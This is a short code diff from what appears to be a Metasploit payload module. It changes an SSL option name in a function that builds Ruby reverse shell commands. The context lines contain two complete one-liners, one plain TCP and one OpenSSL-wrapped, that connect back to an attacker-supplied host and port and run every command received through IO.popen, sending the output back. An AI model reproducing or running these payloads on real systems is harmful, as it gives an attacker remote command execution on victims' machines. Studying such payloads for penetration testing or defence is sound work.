@@ -44,7 +44,7 @@ module Metasploit3
 	def command_string
 		lhost = datastore['LHOST']
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		if datastore['SSL']
+		if datastore['SSLHandler']
 			"ruby -rsocket -ropenssl -e 'exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end'"
 		else
 			"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
